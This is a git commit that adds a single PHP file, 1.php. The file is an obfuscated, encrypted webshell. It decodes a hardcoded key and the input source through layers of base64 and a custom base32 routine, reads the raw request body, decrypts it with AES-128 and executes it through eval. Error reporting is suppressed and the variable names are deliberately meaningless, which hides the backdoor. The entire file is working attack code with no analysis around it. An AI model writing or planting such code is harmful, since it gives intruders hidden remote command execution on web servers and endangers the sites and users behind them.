c41feb2eefa5195c38124e6cdf12621ad73f13f6
LiYiZhou <62521022+apt-007@users.noreply.github.com>
2024-11-20 09:54:55 +0800

    Create 1.php

---
+++ 1.php
@@ -0,0 +1,44 @@
+<?php
+@error_reporting(0);
+session_start();
+    $govAiGGyTamSfgtK= base64_decode(base64_decode("TVRaaFkyRmpZekExWVdGbVlXWTI=")).chr(55);
+    $_SESSION['k']=$govAiGGyTamSfgtK;
+    session_write_close();
+    $govuwY=base64_decode(base64_decode("YjJKMWFHRnZjbkJtTlhWM05EUmtkbTl4"));
+    $govQVP='openssl';
+    $govVgwFH=govt8nsrbfZGqPf($govuwY);
+    $govVf="file_g".chr(101)."t_"."con".base64_decode("dGVudHM=");
+    $govCgpmTEj7EJlKZw5=$govVf($govVgwFH);
+    if(!extension_loaded($govQVP))
+    {
+        $govcYA9pcVSlV6jgkE="base64_"."decode";
+        $govCgpmTEj7EJlKZw5=$govcYA9pcVSlV6jgkE("/*X]-DP@i*/".$govCgpmTEj7EJlKZw5);
+        for($i=0;$i<strlen($govCgpmTEj7EJlKZw5);$i++) {
+                 
+            }
+    }
+    $govCgpmTEj7EJlKZw5=openssl_decrypt($govCgpmTEj7EJlKZw5, base64_decode(base64_decode("UVVWVE1UST0=")).chr(56), $govAiGGyTamSfgtK);
+    $govTIIOmv8xrPLn=explode('|',$govCgpmTEj7EJlKZw5);
+    $govo5yrs=$govTIIOmv8xrPLn[1];
+    class govvoaqc{public function __invoke($p) {eval("/*X]-DP@i*/".$p."");}}
+    @call_user_func(new govvoaqc(),$govo5yrs);
+    function govt8nsrbfZGqPf($govYhT1eDZ6){
+    $di15 = '';
+    $gov8UdLf54w = (1409+49441)*intval(chr(48));
+    $govo = (8023-9740)*intval(chr(48));
+    for ($i = 0, $j = strlen($govYhT1eDZ6); $i < $j; $i++){
+        $gov8UdLf54w <<= 5;
+        if ($govYhT1eDZ6[$i] >= 'a' && $govYhT1eDZ6[$i] <= 'z'){
+            $gov8UdLf54w += (ord($govYhT1eDZ6[$i]) - 97);
+        } elseif ($govYhT1eDZ6[$i] >= '2' && $govYhT1eDZ6[$i] <= '7') {
+            $gov8UdLf54w += (24 + $govYhT1eDZ6[$i]);
+        } else {
+            exit(1);
+        }
+        $govo += 5;
+        while ($govo >= 8){
+            $govo -= 8;
+            $di15 .= chr($gov8UdLf54w >> $govo);
+            $gov8UdLf54w &= ((1 << $govo) - 1);}}
+    return $di15;}
+?>
